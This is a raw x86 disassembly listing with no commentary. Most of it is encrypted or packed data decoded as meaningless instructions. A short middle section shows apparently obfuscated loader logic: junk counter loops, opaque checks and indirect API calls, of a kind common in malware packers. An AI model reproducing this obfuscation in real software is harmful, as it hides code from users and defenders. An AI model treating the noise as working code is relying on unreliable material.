  413062:	or     dh,BYTE PTR [ebp+0x16c81d7c]
  413068:	adc    DWORD PTR [ebp-0x46],edi
  41306b:	iret   
  41306c:	push   ecx
  41306d:	pop    edi
  41306e:	mov    BYTE PTR [esi+0x56],dh
  413071:	repz dec esi
  413073:	dec    ebp
  413074:	adc    dl,bl
  413076:	shr    esp,1
  413078:	neg    DWORD PTR [ebp-0x4c]
  41307b:	lods   eax,DWORD PTR ds:[esi]
  41307c:	loope  0x41302c
  41307e:	dec    ebx
  41307f:	mov    ah,0x16
  413081:	and    al,0xac
  413083:	into   
  413084:	leave  
  413085:	fs aaa 
  413087:	in     al,0x79
  413089:	(bad)  
  41308a:	out    dx,eax
  41308b:	cmp    ecx,DWORD PTR [edx+0x3b58c23a]
  413091:	nop
  413092:	sbb    al,0x49
  413094:	mov    esp,0xa09cfb8e
  413099:	push   ecx
  41309a:	inc    edx
  41309b:	and    DWORD PTR [edx-0x19d25628],edi
  4130a1:	sub    DWORD PTR [edx-0x39f7c5d0],ecx
  4130a7:	inc    ax
  4130a9:	sbb    BYTE PTR [esi-0x6d],ah
  4130ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130ad:	xor    dh,BYTE PTR [esi-0x66]
  4130b0:	std    
  4130b1:	shl    DWORD PTR [edi+0x4b],1
  4130b4:	inc    ebx
  4130b5:	shl    DWORD PTR [edi+0x47d25af1],1
  4130bb:	hlt    
  4130bc:	dec    ecx
  4130bd:	push   ds
  4130be:	call   0xecd2:0xea22eef0
  4130c5:	cmp    BYTE PTR [ebp+0x7db11ab],bh
  4130cb:	jno    0x413132
  4130cd:	jns    0x413127
  4130cf:	lods   eax,DWORD PTR ds:[esi]
  4130d0:	repnz iret 
  4130d2:	imul   ecx,DWORD PTR [edi],0x727d2a12
  4130d8:	cmp    cl,bl
  4130da:	add    ch,0x97
  4130dd:	(bad)  
  4130de:	cmp    sp,WORD PTR [esi]
  4130e1:	mov    BYTE PTR [edx-0x1199b376],bl
  4130e7:	not    BYTE PTR [eax]
  4130e9:	sahf   
  4130ea:	ror    DWORD PTR [edx+ebp*2],0xdc
  4130ee:	xchg   edx,eax
  4130ef:	cwde   
  4130f0:	mov    ds:0x42a67413,al
  4130f5:	jo     0x413090
  4130f7:	ds cmp eax,0x6d7800fd
  4130fd:	dec    ecx
  4130fe:	lea    ecx,[edi-0x2ee465b8]
  413104:	mov    ds:0xf6d73a3f,al
  413109:	js     0x413162
  41310b:	jp     0x413142
  41310d:	nop
  41310e:	or     al,0x44
  413110:	enter  0x2d4f,0xf8
  413114:	icebp  
  413115:	aad    0x3e
  413117:	mov    al,0xfb
  413119:	rcr    DWORD PTR [ecx-0x4299df53],cl
  41311f:	popf   
  413120:	clc    
  413121:	add    BYTE PTR [ebp+0x55dee390],al
  413127:	stos   DWORD PTR es:[edi],eax
  413128:	sbb    al,BYTE PTR [eax]
  41312a:	mov    ch,0xef
  41312c:	sar    BYTE PTR [edx],0xdd
  41312f:	xchg   ebx,eax
  413130:	sbb    edi,DWORD PTR [edx]
  413132:	(bad)  
  413134:	jmp    0xac334a2b
  413139:	test   eax,0x4192a3d8
  41313e:	or     eax,esp
  413140:	pop    ecx
  413141:	mov    edi,0xd01ad835
  413146:	or     ch,bh
  413148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413149:	cmp    ebx,ecx
  41314b:	and    BYTE PTR [esi-0x496b73e9],cl
  413151:	adc    al,0xf5
  413153:	adc    al,0xe9
  413155:	and    DWORD PTR [ebx-0x20],0xb3dc3ac8
  41315c:	nop
  41315d:	inc    esi
  41315e:	das    
  41315f:	(bad)  
  413160:	(bad)  
  413161:	push   ds
  413162:	clc    
  413163:	jp     0x4130fa
  413165:	and    DWORD PTR [esi+0x18ac7afe],edi
  41316b:	dec    ebp
  41316c:	sti    
  41316d:	sbb    BYTE PTR [ecx+0x1f],0x7a
  413171:	sub    BYTE PTR [eax-0x35],dh
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	xchg   edi,eax
  413176:	pop    ds
  413177:	sub    edx,edi
  413179:	mov    bh,0x9
  41317b:	cmp    DWORD PTR [ecx+0x8ab1af6],0xffffffbf
  413182:	sub    al,0xe0
  413184:	test   al,0xd5
  413186:	in     eax,0x93
  413188:	sub    DWORD PTR [ebx],edx
  41318a:	cmp    eax,0xdf2e073a
  41318f:	dec    eax
  413190:	adc    ebx,DWORD PTR [edi-0x42086f8]
  413196:	jne    0x41317f
  413198:	loop   0x4131ee
  41319a:	(bad)  
  41319b:	xor    ebx,eax
  41319d:	ins    DWORD PTR es:[edi],dx
  41319e:	and    eax,DWORD PTR [ebx+0x65]
  4131a1:	call   0x7e96:0xbf042e43
  4131a8:	fwait
  4131a9:	cmp    BYTE PTR [esp+ebx*2-0x72f9b852],cl
  4131b0:	mov    ebx,0xcd003cac
  4131b5:	adc    al,0x67
  4131b8:	inc    ebp
  4131b9:	inc    edi
  4131ba:	dec    ecx
  4131bb:	je     0x413169
  4131bd:	pop    ebp
  4131be:	push   cs
  4131bf:	in     al,dx
  4131c0:	(bad)  
  4131c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c3:	xchg   ebp,eax
  4131c4:	int3   
  4131c5:	xchg   DWORD PTR [eax],ecx
  4131c7:	mov    ds:0x91bc07a6,eax
  4131cc:	lock pop ebx
  4131ce:	jae    0x413245
  4131d0:	jecxz  0x413239
  4131d2:	push   es
  4131d3:	(bad)  
  4131d4:	ror    DWORD PTR [ebx-0x72],cl
  4131d7:	xchg   edi,eax
  4131d8:	mov    ecx,0xde6b2fd5
  4131dd:	sti    
  4131de:	mov    DWORD PTR [edx-0x50],edx
  4131e1:	in     eax,dx
  4131e2:	jmp    0xdafd:0xa677b1b2
  4131e9:	or     DWORD PTR [ebp-0x3a3b7259],eax
  4131ef:	lods   al,BYTE PTR ds:[esi]
  4131f0:	jmp    0xa32d84c5
  4131f5:	(bad)  
  4131f7:	stos   DWORD PTR es:[edi],eax
  4131f8:	and    al,0x55
  4131fa:	xor    al,0x65
  4131fc:	rcr    BYTE PTR [ecx],1
  4131fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ff:	mov    eax,0xa66eb4b5
  413204:	pop    edx
  413205:	out    dx,eax
  413206:	xchg   esp,eax
  413207:	ret    0x95cf
  41320a:	dec    edx
  41320b:	jne    0x413242
  41320d:	sahf   
  41320e:	push   es
  41320f:	(bad)  
  413211:	pusha  
  413212:	or     al,0x6a
  413214:	call   0x584c:0xaaa967a2
  41321b:	sub    BYTE PTR [esi],0x7f
  41321e:	jg     0x4131e5
  413220:	(bad)  
  413221:	repnz xchg edi,eax
  413223:	out    dx,eax
  413224:	scas   eax,DWORD PTR es:[edi]
  413225:	(bad)  
  413227:	mov    al,dl
  413229:	loop   0x413253
  41322b:	jle    0x4131b8
  41322d:	(bad)  
  41322e:	cwde   
  41322f:	repnz cmp BYTE PTR [ebp+0x7d08ade4],ah
  413236:	cmp    ebp,esp
  413238:	jns    0x413253
  41323a:	dec    ecx
  41323b:	int3   
  41323c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41323e:	test   dl,bl
  413240:	or     ebx,DWORD PTR [ebx]
  413242:	shr    BYTE PTR [esi],1
  413244:	mov    ds:0xe395dfbc,eax
  413249:	aam    0x7e
  41324b:	fnstcw WORD PTR [ebp-0xffe88b9]
  413251:	dec    eax
  413252:	add    eax,0x1b7a20
  413257:	cmc    
  413258:	sahf   
  413259:	mov    ah,al
  41325b:	loop   0x4132d5
  41325d:	pop    ecx
  41325e:	adc    eax,0xb8fb9590
  413263:	icebp  
  413264:	out    dx,eax
  413265:	sar    al,1
  413267:	xlat   BYTE PTR ds:[ebx]
  413268:	sti    
  413269:	xchg   ecx,eax
  41326a:	sti    
  41326b:	or     BYTE PTR [edi-0x51],dh
  41326e:	mov    al,0xc8
  413270:	mov    esp,0xd27cadad
  413275:	or     al,0x26
  413277:	ficom  DWORD PTR [ebp-0x41c4e8a5]
  41327d:	inc    esi
  41327e:	push   0x91255dd
  413283:	iret   
  413284:	sub    DWORD PTR [esi+0x25],ebp
  413287:	fistp  DWORD PTR [eax]
  413289:	mov    bh,BYTE PTR [edi+0x63a06502]
  41328f:	dec    ebp
  413290:	xchg   edx,eax
  413291:	push   esi
  413292:	push   0x5d96a573
  413297:	jl     0x413298
  413299:	out    0x80,eax
  41329b:	xor    BYTE PTR [ebx+ebx*2+0x5241e2dc],dh
  4132a2:	push   esi
  4132a3:	add    eax,0xd2d755c0
  4132a8:	and    eax,DWORD PTR [esi]
  4132aa:	leave  
  4132ab:	mov    al,0xae
  4132ad:	pop    ecx
  4132ae:	xor    BYTE PTR [ebx+eiz*4],ch
  4132b1:	push   es
  4132b2:	or     edx,DWORD PTR [ebp+0x6b]
  4132b5:	fsubr  DWORD PTR [ebx]
  4132b7:	dec    ecx
  4132b8:	mov    esi,0xc48abd1e
  4132bd:	fs pop ebp
  4132bf:	in     al,0xde
  4132c1:	and    BYTE PTR [ebp+0x63],ch
  4132c4:	ins    BYTE PTR es:[edi],dx
  4132c5:	ss sbb al,0x27
  4132c8:	stos   BYTE PTR es:[edi],al
  4132c9:	and    bl,BYTE PTR [ecx+0x67]
  4132cc:	xchg   esp,esi
  4132ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132cf:	aaa    
  4132d0:	sbb    al,0x9d
  4132d2:	sub    dl,BYTE PTR [eax+0x2a]
  4132d5:	rcr    BYTE PTR [eax-0x6e],1
  4132d8:	jmp    0xa6206abb
  4132dd:	and    esp,edi
  4132df:	mov    esi,0x3def8a87
  4132e4:	int3   
  4132e5:	or     al,0x7d
  4132e8:	scas   al,BYTE PTR es:[edi]
  4132e9:	push   ecx
  4132ea:	dec    esi
  4132eb:	mov    edi,0x330197d5
  4132f0:	fstp   st(0)
  4132f2:	addr16 pop ds
  4132f4:	test   eax,0x638a930f
  4132f9:	imul   ebx,DWORD PTR [ecx+0x6a],0x1c
  4132fd:	int    0x9a
  4132ff:	sbb    cl,BYTE PTR [ebx]
  413301:	repz add esp,DWORD PTR [ecx]
  413304:	out    dx,eax
  413305:	(bad)  
  413306:	cmc    
  413307:	jecxz  0x4132b8
  413309:	ret    0xdfcc
  41330c:	mov    bh,0xf7
  41330e:	stc    
  41330f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413310:	mov    es,WORD PTR [esi]
  413312:	mov    ebx,0x45415996
  413317:	mov    DWORD PTR [ecx+esi*4],0x9c13f0d4
  41331e:	mov    cl,0x16
  413320:	ins    BYTE PTR es:[edi],dx
  413321:	mov    WORD PTR [esi+0x32],es
  413324:	rcl    DWORD PTR [esi-0x5d8ac533],1
  41332a:	mov    ecx,0xa2aa2825
  41332f:	cli    
  413330:	cmp    BYTE PTR [esi+0x58],ch
  413333:	inc    ecx
  413334:	hlt    
  413335:	jne    0x4132d9
  413337:	(bad)  
  413338:	aaa    
  413339:	pop    edx
  41333a:	es dec ecx
  41333c:	dec    edx
  41333d:	mov    DWORD PTR [edx],ecx
  41333f:	mov    DWORD PTR ds:0x420e8e,0x16
  413349:	cmp    DWORD PTR ds:0x420e8e,0x0
  413350:	je     0x4133a5
  413356:	cmp    DWORD PTR ds:0x420e8e,0x2
  41335d:	jne    0x413373
  413363:	push   0x4d61
  413368:	push   0x424000
  41336d:	call   DWORD PTR ds:0x4247fd
  413373:	cmp    DWORD PTR ds:0x420e8e,0x3
  41337a:	jne    0x41338d
  413380:	mov    ecx,DWORD PTR ds:0x420e8e
  413386:	dec    ecx
  413387:	mov    DWORD PTR ds:0x420e8e,ecx
  41338d:	mov    ecx,DWORD PTR ds:0x420e8e
  413393:	dec    ecx
  413394:	mov    DWORD PTR ds:0x420e8e,ecx
  41339a:	jmp    0x413349
  41339f:	sbb    ecx,0x253c
  4133a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4133a8:	and    DWORD PTR ds:0x42201c,0x420efc
  4133b2:	xor    ecx,eax
  4133b4:	adc    DWORD PTR ds:0x420f70,0x420ef8
  4133be:	add    ecx,esi
  4133c0:	mov    DWORD PTR [ebp-0x20],ecx
  4133c3:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  4133ca:	mov    ecx,DWORD PTR ds:0x420eec
  4133d0:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4133d7:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  4133de:	mov    ecx,0x748f
  4133e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4133e6:	mov    DWORD PTR [ebp+0x8],ecx
  4133e9:	mov    DWORD PTR ds:0x420f68,0x5b27
  4133f3:	jmp    0x413647
  4133f8:	xor    DWORD PTR ds:0x422008,edx
  4133fe:	mov    ecx,DWORD PTR [ebp+0x8]
  413401:	sub    DWORD PTR ds:0x420fa8,0x420ef8
  41340b:	mov    edx,DWORD PTR [ebp-0x8]
  41340e:	sub    DWORD PTR ds:0x420e86,0x420f98
  413418:	xor    ecx,eax
  41341a:	sbb    DWORD PTR ds:0x420f60,0x61d9
  413424:	xor    edx,eax
  413426:	xor    DWORD PTR ds:0x420f04,0x2d2e
  413430:	sub    ecx,edx
  413432:	sub    ecx,esi
  413434:	xor    ecx,eax
  413436:	and    DWORD PTR ds:0x420e9e,0x0
  413440:	mov    edx,DWORD PTR ds:0x420e9e
  413446:	inc    edx
  413447:	mov    DWORD PTR ds:0x420e9e,edx
  41344d:	cmp    DWORD PTR ds:0x420e9e,0x5
  413454:	jne    0x41346d
  41345a:	push   0x4241e6
  41345f:	push   0x1
  413461:	push   DWORD PTR [ebp-0x10]
  413464:	push   DWORD PTR [ebp-0x28]
  413467:	call   DWORD PTR ds:0x424801
  41346d:	cmp    DWORD PTR ds:0x420e9e,0x4
  413474:	jne    0x413487
  41347a:	mov    edx,DWORD PTR ds:0x420e9e
  413480:	inc    edx
  413481:	mov    DWORD PTR ds:0x420e9e,edx
  413487:	cmp    DWORD PTR ds:0x420e9e,0x18
  41348e:	jb     0x413440
  413494:	mov    DWORD PTR [ebp+0x8],ecx
  413497:	dec    edx
  413498:	mov    ecx,DWORD PTR [ebp+0x8]
  41349b:	add    edx,DWORD PTR ds:0x420e92
  4134a1:	mov    edx,DWORD PTR [ebp-0x64]
  4134a4:	add    DWORD PTR ds:0x420fa8,0x502e
  4134ae:	lea    ecx,[edx+ecx*1+0x5708f2]
  4134b5:	and    DWORD PTR ds:0x420f64,0x0
  4134bf:	mov    edx,DWORD PTR ds:0x420f64
  4134c5:	inc    edx
  4134c6:	mov    DWORD PTR ds:0x420f64,edx
  4134cc:	cmp    DWORD PTR ds:0x420f64,0x1a
  4134d3:	jne    0x4134e7
  4134d9:	push   0x420f04
  4134de:	push   DWORD PTR [ebp-0x24]
  4134e1:	call   DWORD PTR ds:0x424805
  4134e7:	cmp    DWORD PTR ds:0x420f64,0x15
  4134ee:	jb     0x4134bf
  4134f4:	or     DWORD PTR ds:0x422008,0x1488
  4134fe:	mov    DWORD PTR [ebp-0x64],ecx
  413501:	mov    ecx,DWORD PTR [ebp+0x8]
  413504:	mov    edx,DWORD PTR [ebp-0x60]
  413507:	lea    ecx,[edx+ecx*1+0x5708f2]
  41350e:	mov    DWORD PTR [ebp-0x60],ecx
  413511:	mov    ecx,DWORD PTR [ebp+0x8]
  413514:	mov    edx,DWORD PTR ds:0x422000
  41351a:	adc    DWORD PTR ds:0x420fa4,edx
  413520:	mov    edx,DWORD PTR [ebp-0x5c]
  413523:	sbb    DWORD PTR ds:0x420fa4,0x6605
  41352d:	lea    ecx,[edx+ecx*1+0x5708f3]
  413534:	and    DWORD PTR ds:0x420f5c,0x0
  41353e:	jmp    0x413552
  413543:	xor    edx,edx
  413545:	xor    edx,DWORD PTR ds:0x420f5c
  41354b:	inc    edx
  41354c:	mov    DWORD PTR ds:0x420f5c,edx
  413552:	cmp    DWORD PTR ds:0x420f5c,0x13
  413559:	jae    0x4135ab
  41355f:	cmp    DWORD PTR ds:0x420f5c,0x5
  413566:	jne    0x41358a
  41356c:	push   DWORD PTR [ebp-0x20]
  41356f:	push   0x420f04
  413574:	push   DWORD PTR [ebp-0x20]
  413577:	push   0x4240b9
  41357c:	push   0x1238
  413581:	push   DWORD PTR [ebp-0xc]
  413584:	call   DWORD PTR ds:0x42480d
  41358a:	cmp    DWORD PTR ds:0x420f5c,0x4
  413591:	jne    0x4135a4
  413597:	mov    edx,DWORD PTR ds:0x420f5c
  41359d:	inc    edx
  41359e:	mov    DWORD PTR ds:0x420f5c,edx
  4135a4:	jmp    0x413543
  4135a9:	neg    edx
  4135ab:	mov    DWORD PTR [ebp-0x5c],ecx
  4135ae:	and    DWORD PTR ds:0x420fa4,0x0
  4135b8:	mov    edx,DWORD PTR ds:0x420fa4
  4135be:	inc    edx
  4135bf:	mov    DWORD PTR ds:0x420fa4,edx
  4135c5:	cmp    DWORD PTR ds:0x420fa4,0x20
  4135cc:	jne    0x4135d8
  4135d2:	call   DWORD PTR ds:0x424811
  4135d8:	cmp    DWORD PTR ds:0x420fa4,0x18
  4135df:	jb     0x4135b8
  4135e5:	adc    edx,0x1b19
  4135eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4135ee:	mov    edx,DWORD PTR [ebp-0x58]
  4135f1:	lea    ecx,[edx+ecx*1+0x5708f0]
  4135f8:	xor    edx,DWORD PTR ds:0x420f08
  4135fe:	mov    DWORD PTR [ebp-0x58],ecx
  413601:	mov    ecx,DWORD PTR [ebp+0x8]
  413604:	xor    DWORD PTR ds:0x420f64,0x420eec
  41360e:	mov    edx,DWORD PTR [ebp-0x54]
  413611:	lea    ecx,[edx+ecx*1+0x5708f1]
  413618:	add    DWORD PTR ds:0x420f08,ebx
  41361e:	mov    DWORD PTR [ebp-0x54],ecx
  413621:	or     ecx,DWORD PTR ds:0x422018
  413627:	mov    ecx,DWORD PTR [ebp+0x8]
  41362a:	mov    edx,DWORD PTR [ebp-0x50]
  41362d:	inc    DWORD PTR ds:0x420f00
  413633:	lea    ecx,[edx+ecx*1+0x5708fe]
  41363a:	and    DWORD PTR ds:0x420e9a,0x420f6c
  413644:	mov    DWORD PTR [ebp-0x50],ecx
  413647:	inc    ecx
  413648:	mov    ecx,DWORD PTR [ebp+0x8]
  41364b:	adc    DWORD PTR ds:0x420ea2,0x68a
  413655:	xor    ecx,eax
  413657:	and    DWORD PTR ds:0x420e8e,0x1a66
  413661:	add    ecx,esi
  413663:	mov    DWORD PTR ds:0x420e92,0x4bef
  41366d:	jne    0x4133f8
  413673:	jmp    0x420dd1
  413678:	mov    ecx,DWORD PTR [ebp-0x1c]
  41367b:	mov    edx,DWORD PTR ds:0x423008
  413681:	mov    edx,DWORD PTR [edx]
  413683:	sub    DWORD PTR ds:0x420fb4,edx
  413689:	mov    edx,DWORD PTR [ebp-0x8]
  41368c:	xor    DWORD PTR ds:0x420f04,0x3196
  413696:	xor    ecx,eax
  413698:	xor    edx,eax
  41369a:	sbb    DWORD PTR ds:0x422000,0x24d3
  4136a4:	sub    ecx,edx
  4136a6:	xor    DWORD PTR ds:0x420e82,0x420e8a
  4136b0:	sub    ecx,esi
  4136b2:	xor    ecx,eax
  4136b4:	mov    DWORD PTR [ebp-0x1c],ecx
  4136b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4136ba:	mov    DWORD PTR [ebp+0x8],ecx
  4136bd:	jmp    0x4136ef
  4136c2:	mov    ecx,DWORD PTR [ebp+0x8]
  4136c5:	mov    edx,DWORD PTR [ebp-0x8]
  4136c8:	xor    ecx,eax
  4136ca:	xor    edx,eax
  4136cc:	sub    ecx,edx
  4136ce:	sub    ecx,esi
  4136d0:	xor    ecx,eax
  4136d2:	mov    DWORD PTR [ebp+0x8],ecx
  4136d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4136d8:	mov    edx,DWORD PTR [ebp+0x8]
  4136db:	imul   edx,edx,0x5708f2
  4136e1:	xor    ecx,eax
  4136e3:	add    ecx,esi
  4136e5:	lea    ecx,[ebp+ecx*4-0x64]
  4136e9:	mov    edi,DWORD PTR [ecx]
  4136eb:	add    edx,edi
  4136ed:	mov    DWORD PTR [ecx],edx
  4136ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4136f2:	xor    ecx,eax
  4136f4:	jmp    0x415a81
  4136f9:	js     0x4136a4
  4136fb:	inc    edx
  4136fc:	iret   
  4136fd:	aaa    
  4136fe:	jae    0x41377b
  413700:	test   eax,0x7e5a8e7d
  413705:	es stos BYTE PTR es:[edi],al
  413707:	hlt    
  413708:	xor    eax,0x7a7a73be
  41370d:	or     bl,BYTE PTR [edi+0x7a]
  413710:	jp     0x413778
  413712:	(bad)  
  413713:	jl     0x4136fa
  413715:	lock cmp BYTE PTR [edx],ah
  413718:	iret   
  413719:	minps  xmm2,XMMWORD PTR [esi-0x33]
  41371d:	adc    cl,BYTE PTR [edx+0x44dbd8d]
  413723:	imul   esp,edi,0xffffffd3
  413726:	loop   0x4136c7
  413728:	mov    cl,0x31
  41372a:	pop    ss
  41372b:	mov    edi,0xa1f0d32
  413730:	clc    
  413731:	mov    ebp,0xa19516bb
  413736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413737:	cmp    cl,BYTE PTR [esp+ecx*2+0x22ca567c]
  41373e:	dec    eax
  41373f:	cmp    al,0x28
  413741:	and    BYTE PTR [eax],0xdc
  413744:	in     eax,dx
  413745:	shl    DWORD PTR [edi],0xa0
  413748:	mov    esi,0x23284a84
  41374d:	inc    ebx
  41374e:	daa    
  41374f:	push   eax
  413750:	fwait
  413751:	mov    ebp,0x53fe88e6
  413756:	pop    ecx
  413757:	jmp    0x4137a2
  413759:	loop   0x4137c7
  41375b:	inc    edx
  41375c:	arpl   WORD PTR [ebp+0x285ec370],ax
  413762:	enter  0x5ff,0xd0
  413766:	iret   
  413767:	push   esi
  413768:	push   esp
  413769:	lea    ebx,[eax+0x34]
  41376c:	xchg   ebp,eax
  41376d:	inc    ebp
  41376e:	push   ecx
  41376f:	dec    BYTE PTR [eax+0x32]
  413772:	and    DWORD PTR [esi+0x72f6eb27],ecx
  413778:	rcl    DWORD PTR [esi+0x1e],cl
  41377b:	retf   
  41377c:	cwde   
  41377d:	setg   bh
  413780:	add    al,ch
  413782:	cmp    dh,BYTE PTR [edx+0x50]
  413785:	xchg   ebx,eax
  413786:	aas    
  413787:	or     BYTE PTR [ecx+ebp*2],dl
  41378a:	inc    ecx
  41378b:	hlt    
  41378c:	and    eax,0xd1eb6759
  413791:	sub    esp,ebp
  413793:	out    dx,eax
  413794:	lahf   
  413795:	icebp  
  413796:	mov    eax,0x2593773f
  41379b:	repnz retf 
  41379d:	ss jb  0x413818
  4137a0:	das    
  4137a1:	rcr    DWORD PTR [esp+esi*8-0x35],0x3d
  4137a6:	dec    DWORD PTR [edi+eiz*2]
  4137a9:	inc    ecx
  4137aa:	ret    
  4137ab:	add    BYTE PTR [ecx-0x51],bl
  4137ae:	sbb    al,0x1f
  4137b0:	rcl    BYTE PTR [esi+0x3f20c74e],0x97
  4137b7:	mov    BYTE PTR [edx+eiz*4-0x5d5137c2],bh
  4137be:	xchg   ecx,eax
  4137bf:	in     al,dx
  4137c0:	xchg   DWORD PTR [esi],ebx
  4137c2:	(bad)  
  4137c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137c4:	into   
  4137c5:	jge    0x41382a
  4137c7:	nop
  4137c8:	mov    edx,DWORD PTR [ecx+0x5]
  4137cb:	mov    cl,0xcf
  4137cd:	stos   BYTE PTR es:[edi],al
  4137ce:	mov    bh,0x4
  4137d0:	cmp    al,0x85
  4137d2:	push   esi
  4137d3:	(bad)
  4137d6:	push   edi
  4137d7:	xchg   esp,eax
  4137d8:	ret    
  4137d9:	lods   eax,DWORD PTR ds:[esi]
  4137da:	test   BYTE PTR [edi],cl
  4137dc:	ds adc eax,0xe930f5a7
  4137e2:	jg     0x41377b
  4137e4:	out    dx,al
  4137e5:	out    dx,al
  4137e6:	mov    esp,DWORD PTR [ecx+0x45]
  4137e9:	jmp    0xac2a:0x2b80003b
  4137f0:	push   edx
  4137f1:	mov    dh,BYTE PTR [eax]
  4137f3:	cmp    bh,cl
  4137f5:	data16 mov ah,0xff
  4137f8:	pop    ss
  4137f9:	call   0x7809:0x4abe9051
  413800:	(bad)  
  413801:	enter  0xdc1b,0x68
  413805:	cmp    al,0xcf
  413807:	jp     0x413887
  413809:	inc    edi
  41380a:	mov    ebp,0xbee90dca
  41380f:	adc    edi,eax
  413811:	adc    BYTE PTR [esi+0x2dc9a3d],bh
  413817:	pop    esi
  413818:	pop    edi
  413819:	cmp    BYTE PTR [edx+eiz*4],bh
  41381c:	mov    ss,ebp
  41381e:	iret   
  41381f:	hlt    
  413820:	push   ecx
  413821:	adc    ebp,DWORD PTR [ecx]
  413823:	mov    edi,gs
  413825:	clc    
  413826:	sub    edi,esi
  413828:	repnz sbb dl,BYTE PTR [ebx-0x2298d1ca]
  41382f:	ret    0x7fda
  413832:	out    dx,al
  413833:	adc    al,bl
  413835:	shr    ebx,cl
  413837:	mov    bh,BYTE PTR [edi-0x684d51]
  41383d:	ds dec edx
  41383f:	aam    0x9d
  413841:	test   BYTE PTR [edx-0x72],bh
  413844:	dec    ebp
  413845:	(bad)  
  413846:	xor    esp,DWORD PTR [ecx-0x135261df]
  41384c:	leave  
  41384d:	sbb    al,0xbd
  41384f:	in     eax,dx
  413850:	and    al,al
  413852:	test   ah,0xcc
  413855:	call   0x70c6:0x7d314427
  41385c:	sbb    al,al
  41385e:	push   edi
  41385f:	ins    BYTE PTR es:[edi],dx
  413860:	rcl    ah,cl
  413862:	into   
  413863:	cmp    eax,0x871e2718
  413868:	test   DWORD PTR [esp+eiz*8+0x8],edx
  41386c:	nop
  41386d:	fild   DWORD PTR [esi+0x27]
  413870:	fldcw  WORD PTR [ebx+ecx*4-0x160ef1aa]
  413878:	cdq    
  413879:	mov    dl,0xe9
  41387b:	and    al,BYTE PTR [ebx-0x13b0cb7]
  413881:	xor    eax,ebp
  413883:	push   ebx
  413884:	and    al,0x8e
  413886:	and    DWORD PTR [eax-0x6dce7c14],esi
  41388c:	dec    edi
  41388d:	iret   
  41388e:	mov    eax,0x26a31c06
  413893:	push   esp
  413894:	daa    
  413895:	fisubr DWORD PTR [ecx-0x1cb19256]
  41389b:	icebp  
  41389c:	inc    ebp
  41389d:	xor    esi,DWORD PTR [esi+0x37624543]
  4138a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138a4:	out    0x87,al
  4138a6:	inc    ecx
  4138a7:	js     0x41382d
  4138a9:	mov    esp,0x77602b27
  4138ae:	jge    0x41385f
  4138b0:	push   ss
  4138b1:	jmp    0x413863
  4138b3:	cmp    DWORD PTR [edx],0x5a
  4138b6:	sti    
  4138b7:	out    dx,al
  4138b8:	sub    ah,BYTE PTR [esi]
  4138ba:	gs hlt 
  4138bc:	xchg   DWORD PTR ds:0x7a5696c6,edx
  4138c2:	xchg   BYTE PTR [ebp+0x729d2bb3],ch
  4138c8:	inc    eax
  4138c9:	fsubr  QWORD PTR [edi]
  4138cb:	adc    al,0x3f
  4138cd:	jp     0x41387f
  4138cf:	sub    cl,cl
  4138d1:	call   0xe3b2ff5a
  4138d6:	mov    ecx,0x63be47fb
  4138db:	push   ebx
  4138dc:	jae    0x413880
  4138de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138df:	inc    ebp
  4138e0:	pop    ebp
  4138e1:	mov    ebp,0xb4a48f57
  4138e6:	ss (bad) 
  4138e8:	xchg   ebp,eax
  4138e9:	dec    eax
  4138ea:	jg     0x4138cf
  4138ec:	imul   ebx,DWORD PTR [ebx-0x17472bcc],0x2a
  4138f3:	add    bl,BYTE PTR [edx-0x2c]
  4138f6:	lock sub ebp,DWORD PTR [ecx]
  4138f9:	push   ss
  4138fa:	outs   dx,DWORD PTR ds:[esi]
  4138fb:	mov    BYTE PTR [esp+esi*1+0x74],bh
  4138ff:	inc    esp
  413900:	or     DWORD PTR [ebx-0x49],0x1aa63894
  413907:	sbb    BYTE PTR [esi+0x59],bl
  41390a:	pop    edi
  41390b:	jo     0x41389b
  41390d:	sbb    al,0x21
  41390f:	xchg   edx,eax
  413910:	push   eax
  413911:	push   ss
  413912:	into   
  413913:	adc    dl,al
  413915:	repz mov fs:0x5a37da0c,eax
  41391c:	push   ebp
  41391d:	pop    ecx
  41391e:	fdiv   DWORD PTR [edi]
  413920:	(bad)  
  413921:	jecxz  0x41399b
  413923:	pop    ss
  413924:	sub    DWORD PTR [ebp+edi*2+0x52293e1a],eax
  41392b:	fist   DWORD PTR [edx]
  41392d:	jge    0x413961
  41392f:	rol    DWORD PTR [ebx+0x50],0x7f
  413933:	into   
  413934:	add    DWORD PTR [eax],0xffffff9b
  413937:	xor    al,0x66
  413939:	aam    0x23
  41393b:	mov    edi,edx
  41393d:	cld    
  41393e:	add    bl,ah
  413940:	fcos   
  413942:	sbb    BYTE PTR ss:[ecx+0x4e45fc65],dl
  413949:	les    ecx,FWORD PTR [eax+0xfac8979]
  41394f:	loope  0x41390f
  413951:	mov    ecx,0x845ce25a
  413956:	and    ebx,DWORD PTR [edi+edx*4]
  413959:	push   ebx
  41395a:	js     0x413937
  41395c:	pop    ebx
  41395d:	icebp  
  41395e:	lods   al,BYTE PTR ds:[esi]
  41395f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413960:	jecxz  0x4139c3
  413962:	mov    eax,ds:0x53676a3c
  413967:	or     bl,BYTE PTR [ebp-0x28]
  41396a:	add    al,BYTE PTR [esi+ecx*8-0x716c62e1]
  413971:	out    dx,eax
  413972:	jns    0x4139e1
  413974:	jno    0x413973
